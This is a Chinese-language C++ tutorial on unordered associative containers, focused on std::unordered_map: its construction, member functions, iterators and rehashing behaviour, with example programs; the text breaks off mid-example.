标准库又引入了一类容器，即无序关联式容器。<br>无序关联式容器，又称哈希容器。和关联式容器一样，此类容器存储的也是键值对元素；不同之处在于，关联式容器默认情况下会对存储的元素做升序排序，而无序关联式容器不会。和其它类容器相比，无序关联式容器擅长通过指定键查找对应的值，而遍历容器中存储元素的效率不如关联式容器。<br>基于底层实现采用了不同的数据结构，因此和关联式容器相比，无序容器具有以下 2 个特点：</p><blockquote><p>1.无序容器内部存储的键值对是无序的，各键值对的存储位置取决于该键值对中的键，<br>2.和关联式容器相比，无序容器擅长通过指定键查找对应的值（平均时间复杂度为 O(1)）；但对于使用迭代器遍历容器中存储的元素，无序容器的执行效率则不如关联式容器。</p></blockquote><p>和关联式容器一样，无序容器只是一类容器的统称，其包含有 4 个具体容器，分别为 unordered_map、unordered_multimap、unordered_set 以及 unordered_multiset。</p><table><thead><tr><th>无序容器</th><th>功能</th></tr></thead><tbody><tr><td>unordered_map</td><td>存储键值对 &lt;key, value&gt; 类型的元素，其中各个键值对键的值不允许重复，且该容器中存储的键值对是无序的。</td></tr><tr><td>unordered_multimap</td><td>和 unordered_map 唯一的区别在于，该容器允许存储多个键相同的键值对。</td></tr><tr><td>unordered_set</td><td>不再以键值对的形式存储数据，而是直接存储数据元素本身（当然也可以理解为，该容器存储的全部都是键 key 和值 value 相等的键值对，正因为它们相等，因此只存储 value 即可）。另外，该容器存储的元素不能重复，且容器内部存储的元素也是无序的。</td></tr><tr><td>unordered_multiset</td><td>和 unordered_set 唯一的区别在于，该容器允许存储值相同的元素。</td></tr></tbody></table><p>以上 4 种无序容器的名称，仅是在前面所学的 4 种关联式容器名称的基础上，添加了 “unordered_”。如果已经学完了 map、multimap、set 和 multiset 容器不难发现，以 map 和 unordered_map 为例，其实它们仅有一个区别，即 map 容器内存会对存储的键值对进行排序，而 unordered_map 不会。</p><blockquote><p>C++ 11 标准的 STL 中，在已提供有 4 种关联式容器的基础上，又新增了各自的“unordered”版本（无序版本、哈希版本），提高了查找指定元素的效率。</p></blockquote><p>总的来说，实际场景中如果涉及大量遍历容器的操作，建议首选关联式容器；反之，如果更多的操作是通过键获取对应的值，则应首选无序容器。</p><p>以 unordered_map 容器为例，用法：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建并初始化一个 unordered_map 容器，其存储的 &lt;string,string&gt; 类型的键值对</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; my_uMap&#123;<br>        &#123;<span class="hljs-string">&quot;C语言教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125; &#125;;<br>    <span class="hljs-comment">//查找指定键对应的值，效率比关联式容器高</span><br>    <span class="hljs-built_in">string</span> str = my_uMap.at(<span class="hljs-string">&quot;C语言教程&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;str = &quot;</span> &lt;&lt; str &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//使用迭代器遍历哈希容器，效率不如关联式容器</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = my_uMap.begin(); iter != my_uMap.end(); ++iter)<br>    &#123;<br>        <span class="hljs-comment">//pair 类型键值对分为 2 部分</span><br>        <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>str = https:<span class="hljs-comment">//lichengloong.com/</span><br>C语言教程 https:<span class="hljs-comment">//lichengloong.com/</span><br>Python教程 https:<span class="hljs-comment">//lichengloong.com/</span><br>Java教程 https:<span class="hljs-comment">//lichengloong.com/</span><br></code></pre></div></td></tr></table></figure><h4 id="1-unordered-map容器"><a href="#1-unordered-map容器" class="headerlink" title="1.unordered_map容器"></a>1.unordered_map容器</h4><p>unordered_map 容器在<unordered_map>头文件中，并位于 std 命名空间中。<br>unordered_map 容器，直译过来就是”无序 map 容器”的意思。所谓“无序”，指的是 unordered_map 容器不会像 map 容器那样对存储的数据进行排序。换句话说，unordered_map 容器和 map 容器仅有一点不同，即 map 容器中存储的数据是有序的，而 unordered_map 容器中是无序的。<br>对于已经学过 map 容器的，可以将 unordered_map 容器等价为无序的 map 容器。</p><p>具体来讲，unordered_map 容器和 map 容器一样，以键值对（pair类型）的形式存储数据，存储的各个键值对的键互不相同且不允许被修改。但由于 unordered_map 容器底层采用的是哈希表存储结构，该结构本身不具有对数据的排序功能，所以此容器内部不会自行对存储的键值对进行排序。</p><p>unordered_map 容器模板的定义如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Key</span>,                        //键值对中键的类型</span><br><span class="hljs-class">           <span class="hljs-keyword">class</span> <span class="hljs-title">T</span>,                          //键值对中值的类型</span><br><span class="hljs-class">           <span class="hljs-keyword">class</span> <span class="hljs-title">Hash</span> =</span> hash&lt;Key&gt;,           <span class="hljs-comment">//容器内部存储键值对所用的哈希函数</span><br>           <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pred</span> =</span> equal_to&lt;Key&gt;,       <span class="hljs-comment">//判断各个键值对键相同的规则</span><br>           <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Alloc</span> =</span> allocator&lt; <span class="hljs-built_in">pair</span>&lt;<span class="hljs-keyword">const</span> Key,T&gt; &gt;  <span class="hljs-comment">// 指定分配器对象的类型</span><br>           &gt; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">unordered_map</span>;</span><br></code></pre></div></td></tr></table></figure><p>以上 5 个参数中，必须显式给前 2 个参数传值，并且除特殊情况外，最多只需要使用前 4 个参数，各自的含义和功能如表 所示。</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>&lt;key,T&gt;</td><td>前 2 个参数分别用于确定键值对中键和值的类型，也就是存储键值对的类型。</td></tr><tr><td>Hash = hash<Key></td><td>用于指明容器在存储各个键值对时要使用的哈希函数，默认使用 STL 标准库提供的 hash<key> 哈希函数。注意，默认哈希函数只适用于基本数据类型（包括 string 类型），而不适用于自定义的结构体或者类。</td></tr><tr><td>Pred = equal_to<Key></td><td>要知道，unordered_map 容器中存储的各个键值对的键是不能相等的，而判断是否相等的规则，就由此参数指定。默认情况下，使用 STL 标准库中提供的 equal_to<key> 规则，该规则仅支持可直接用 == 运算符做比较的数据类型。</td></tr></tbody></table><p>总的来说，当无序容器中存储键值对的键为自定义类型时，默认的哈希函数 hash 以及比较函数 equal_to 将不再适用，只能自己设计适用该类型的哈希函数和比较函数，并显式传递给 Hash 参数和 Pred 参数。</p><h5 id="1-1创建方法"><a href="#1-1创建方法" class="headerlink" title="1.1创建方法"></a>1.1创建方法</h5><p>常见的创建 unordered_map 容器的方法有以下几种。</p><ol><li><p>通过调用 unordered_map 模板类的默认构造函数，可以创建空的 unordered_map 容器。比如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; umap;<br></code></pre></div></td></tr></table></figure><p>这样就创建好了一个可存储 &lt;string,string&gt; 类型键值对的 unordered_map 容器。</p></li><li><p>在创建 unordered_map 容器的同时，可以完成初始化操作。比如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; umap&#123;<br>    &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;Linux教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125; &#125;;<br></code></pre></div></td></tr></table></figure></li></ol><p>此方法创建的 umap 容器中，就包含有 3 个键值对元素。</p><ol start="3"><li>另外，还可以调用 unordered_map 模板中提供的复制（拷贝）构造函数，将现有 unordered_map 容器中存储的键值对，复制给新建 unordered_map 容器。<br>在第二种方式创建好 umap 容器的基础上，再创建并初始化一个 umap2 容器：<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">std::unordered_map&lt;std::string, std::string&gt; umap2(umap);<br></code></pre></div></td></tr></table></figure>由此，umap2 容器中就包含有 umap 容器中所有的键值对。</li></ol><p>除此之外，C++ 11 标准中还向 unordered_map 模板类增加了移动构造函数，即以右值引用的方式将临时 unordered_map 容器中存储的所有键值对，全部复制给新建容器。例如：</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//返回临时 unordered_map 容器的函数</span><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span> &lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &gt; retUmap()&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt;tempUmap&#123;<br>        &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Linux教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125; &#125;;<br>    <span class="hljs-keyword">return</span> tempUmap;<br>&#125;<br><span class="hljs-comment">//调用移动构造函数，创建 umap2 容器</span><br>std::unordered_map&lt;std::string, std::string&gt; umap2(retUmap());<br></code></pre></div></td></tr></table></figure><p>无论是调用复制构造函数还是拷贝构造函数，必须保证 2 个容器的类型完全相同。</p><ol start="4"><li>如果不想全部拷贝，可以使用 unordered_map 类模板提供的迭代器，在现有 unordered_map 容器中选择部分区域内的键值对，为新建 unordered_map 容器初始化。例如：<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//传入 2 个迭代器，</span><br>std::unordered_map&lt;std::string, std::string&gt; umap2(++umap.begin(),umap.end());<br></code></pre></div></td></tr></table></figure>通过此方式创建的 umap2 容器，其内部就包含 umap 容器中除第 1 个键值对外的所有其它键值对。</li></ol><h5 id="1-2-unordered-map容器的成员方法"><a href="#1-2-unordered-map容器的成员方法" class="headerlink" title="1.2 unordered_map容器的成员方法"></a>1.2 unordered_map容器的成员方法</h5><p>unordered_map 既可以看做是关联式容器，更属于自成一脉的无序容器。因此在该容器模板类中，既包含一些在学习关联式容器时常见的成员方法，还有一些属于无序容器特有的成员方法。</p><table><thead><tr><th>成员方法</th><th>功能</th></tr></thead><tbody><tr><td>begin()</td><td>返回指向容器中第一个键值对的正向迭代器。</td></tr><tr><td>end()</td><td>返回指向容器中最后一个键值对之后位置的正向迭代器。</td></tr><tr><td>cbegin()</td><td>和 begin() 功能相同，只不过在其基础上增加了 const 属性，即该方法返回的迭代器不能用于修改容器内存储的键值对。</td></tr><tr><td>cend()</td><td>和 end() 功能相同，只不过在其基础上，增加了 const 属性，即该方法返回的迭代器不能用于修改容器内存储的键值对。</td></tr><tr><td>empty()</td><td>若容器为空，则返回 true；否则 false。</td></tr><tr><td>size()</td><td>返回当前容器中存有键值对的个数。</td></tr><tr><td>max_size()</td><td>返回容器所能容纳键值对的最大个数，不同的操作系统，其返回值亦不相同。</td></tr><tr><td>operator[key]</td><td>该模板类中重载了 [] 运算符，其功能是可以向访问数组中元素那样，只要给定某个键值对的键 key，就可以获取该键对应的值。注意，如果当前容器中没有以 key 为键的键值对，则其会使用该键向当前容器中插入一个新键值对。</td></tr><tr><td>at(key)</td><td>返回容器中存储的键 key 对应的值，如果 key 不存在，则会抛出 out_of_range 异常。</td></tr><tr><td>find(key)</td><td>查找以 key 为键的键值对，如果找到，则返回一个指向该键值对的正向迭代器；反之，则返回一个指向容器中最后一个键值对之后位置的迭代器（如果 end() 方法返回的迭代器）。</td></tr><tr><td>count(key)</td><td>在容器中查找以 key 键的键值对的个数。</td></tr><tr><td>equal_range(key)</td><td>返回一个 pair 对象，其包含 2 个迭代器，用于表明当前容器中键为 key 的键值对所在的范围。</td></tr><tr><td>emplace()</td><td>向容器中添加新键值对，效率比 insert() 方法高。</td></tr><tr><td>emplace_hint()</td><td>向容器中添加新键值对，效率比 insert() 方法高。</td></tr><tr><td>insert()</td><td>向容器中添加新键值对。</td></tr><tr><td>erase()</td><td>删除指定键值对。</td></tr><tr><td>clear()</td><td>清空容器，即删除容器中存储的所有键值对。</td></tr><tr><td>swap()</td><td>交换 2 个 unordered_map 容器存储的键值对，前提是必须保证这 2 个容器的类型完全相等。</td></tr><tr><td>bucket_count()</td><td>返回当前容器底层存储键值对时，使用桶（一个线性链表代表一个桶）的数量。</td></tr><tr><td>max_bucket_count()</td><td>返回当前系统中，unordered_map 容器底层最多可以使用多少桶。</td></tr><tr><td>bucket_size(n)</td><td>返回第 n 个桶中存储键值对的数量。</td></tr><tr><td>bucket(key)</td><td>返回以 key 为键的键值对所在桶的编号。</td></tr><tr><td>load_factor()</td><td>返回 unordered_map 容器中当前的负载因子。负载因子，指的是的当前容器中存储键值对的数量（size()）和使用桶数（bucket_count()）的比值，即 load_factor() = size() / bucket_count()。</td></tr><tr><td>max_load_factor()</td><td>返回或者设置当前 unordered_map 容器的负载因子。</td></tr><tr><td>rehash(n)</td><td>将当前容器底层使用桶的数量设置为 n。</td></tr><tr><td>reserve()</td><td>将存储桶的数量（也就是 bucket_count() 方法的返回值）设置为至少容纳count个元（不超过最大负载因子）所需的数量，并重新整理容器。</td></tr><tr><td>hash_function()</td><td>返回当前容器使用的哈希函数对象。</td></tr></tbody></table><p>注意的是，对于实现互换 2 个相同类型 unordered_map 容器的键值对，除了可以调用该容器模板类中提供的 swap() 成员方法外，STL 标准库还提供了同名的 swap() 非成员函数。</p><p>部分函数用法例子：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建空 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; umap;<br>    <span class="hljs-comment">//向 umap 容器添加新键值对</span><br>    umap.emplace(<span class="hljs-string">&quot;Python教程&quot;</span>, <span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>);<br>    umap.emplace(<span class="hljs-string">&quot;Java教程&quot;</span>, <span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>);<br>    umap.emplace(<span class="hljs-string">&quot;Linux教程&quot;</span>, <span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>);<br>    <span class="hljs-comment">//输出 umap 存储键值对的数量</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;umap size = &quot;</span> &lt;&lt; umap.size() &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//使用迭代器输出 umap 容器存储的所有键值对</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = umap.begin(); iter != umap.end(); ++iter) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>umap size = <span class="hljs-number">3</span><br>Python教程 https:<span class="hljs-comment">//lichengloong.com/</span><br>Linux教程 https:<span class="hljs-comment">//lichengloong.com/</span><br>Java教程 https:<span class="hljs-comment">//lichengloong.com/</span><br></code></pre></div></td></tr></table></figure><h5 id="1-3-unordered-map迭代器的用法"><a href="#1-3-unordered-map迭代器的用法" class="headerlink" title="1.3 unordered_map迭代器的用法"></a>1.3 unordered_map迭代器的用法</h5><p>C++ STL 标准库中，unordered_map 容器迭代器的类型为前向迭代器（又称正向迭代器）。这意味着，假设 p 是一个前向迭代器，则其只能进行 *p、p++、++p 操作，且 2 个前向迭代器之间只能用 == 和 != 运算符做比较。</p><p>unordered_map迭代器相关成员方法：</p><table><thead><tr><th>成员方法</th><th>功能</th></tr></thead><tbody><tr><td>begin()</td><td>返回指向容器中第一个键值对的正向迭代器。</td></tr><tr><td>end()</td><td>返回指向容器中最后一个键值对之后位置的正向迭代器。</td></tr><tr><td>cbegin()</td><td>和 begin() 功能相同，只不过在其基础上增加了 const 属性，即该方法返回的迭代器不能用于修改容器内存储的键值对。</td></tr><tr><td>cend()</td><td>和 end() 功能相同，只不过在其基础上，增加了 const 属性，即该方法返回的迭代器不能用于修改容器内存储的键值对。</td></tr><tr><td>find(key)</td><td>查找以 key 为键的键值对，如果找到，则返回一个指向该键值对的正向迭代器；反之，则返回一个指向容器中最后一个键值对之后位置的迭代器（如果 end() 方法返回的迭代器）。</td></tr><tr><td>equal_range(key)</td><td>返回一个 pair 对象，其包含 2 个迭代器，用于表明当前容器中键为 key 的键值对所在的范围。</td></tr></tbody></table><p>equal_range(key) 很少用于 unordered_map 容器，因为该容器中存储的都是键不相等的键值对，即便调用该成员方法，得到的 2 个迭代器所表示的范围中，最多只包含 1 个键值对。事实上，该成员方法更适用于 unordered_multimap 容器。</p><p>分成员方法的用法：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; umap&#123;<br>        &#123;<span class="hljs-string">&quot;Python教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Java教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;Linux教程&quot;</span>,<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&#125; &#125;;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;umap 存储的键值对包括：&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//遍历输出 umap 容器中所有的键值对</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = umap.begin(); iter != umap.end(); ++iter) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;&lt;&quot;</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-string">&quot;&gt;&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-comment">//获取指向指定键值对的前向迭代器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;::iterator iter = umap.find(<span class="hljs-string">&quot;Java教程&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt;<span class="hljs-string">&quot;umap.find(\&quot;Java教程\&quot;) = &quot;</span> &lt;&lt; <span class="hljs-string">&quot;&lt;&quot;</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-string">&quot;&gt;&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>umap 存储的键值对包括：<br>&lt;Python教程, https:<span class="hljs-comment">//lichengloong.com/&gt;</span><br>&lt;Linux教程, https:<span class="hljs-comment">//lichengloong.com/&gt;</span><br>&lt;Java教程, https:<span class="hljs-comment">//lichengloong.com/&gt;</span><br>umap.find(<span class="hljs-string">&quot;Java教程&quot;</span>) = &lt;Java教程, https:<span class="hljs-comment">//lichengloong.com/&gt;</span><br></code></pre></div></td></tr></table></figure><p>需要注意的是，在操作 unordered_map 容器过程（尤其是向容器中添加新键值对）中，一旦当前容器的负载因子超过最大负载因子（默认值为 1.0），该容器就会适当增加桶的数量（通常是翻一倍），并自动执行 rehash() 成员方法，重新调整各个键值对的存储位置（此过程又称“重哈希”），此过程很可能导致之前创建的迭代器失效。</p><blockquote><p>所谓迭代器失效，针对的是那些用于表示容器内某个范围的迭代器，由于重哈希会重新调整每个键值对的存储位置，所以容器重哈希之后，之前表示特定范围的迭代器很可能无法再正确表示该范围。但是，重哈希并不会影响那些指向单个键值对元素的迭代器。</p></blockquote><p>例如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建 umap 容器</span><br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>&gt; umap;<br>    <span class="hljs-comment">//向 umap 容器添加 50 个键值对</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">50</span>; i++) &#123;<br>        umap.emplace(i, i);<br>    &#125;<br>    <span class="hljs-comment">//获取键为 49 的键值对所在的范围</span><br>    <span class="hljs-keyword">auto</span> <span class="hljs-built_in">pair</span> = umap.equal_range(<span class="hljs-number">49</span>);<br>    <span class="hljs-comment">//输出 pair 范围内的每个键值对的键的值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = <span class="hljs-built_in">pair</span>.first; iter != <span class="hljs-built_in">pair</span>.second; ++iter) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//手动调整最大负载因子数</span><br>    umap.max_load_factor(<span class="hljs-number">3.0</span>);<br>    <span class="hljs-comment">//手动调用 rehash() 函数重哈希</span><br>    umap.rehash(<span class="hljs-number">10</span>);<br>    <span class="hljs-comment">//重哈希之后，pair 的范围可能会发生变化</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> iter = <span class="hljs-built_in">pair</span>.first; iter != <span class="hljs-built_in">pair</span>.second; ++iter) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;first 